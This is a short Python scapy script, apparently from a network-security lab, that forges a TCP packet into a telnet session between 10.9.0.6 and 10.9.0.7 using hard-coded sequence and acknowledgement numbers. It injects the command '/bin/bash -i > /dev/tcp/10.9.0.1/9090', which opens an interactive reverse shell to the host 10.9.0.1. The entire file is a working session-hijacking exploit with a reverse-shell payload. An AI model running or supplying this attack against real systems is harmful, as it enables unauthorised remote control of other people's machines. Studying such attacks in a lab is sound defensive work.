#!/usr/bin/env python3
from scapy.all import *


ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=55098, dport=23, flags="A", seq=4226252123, ack=1237393614)
data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
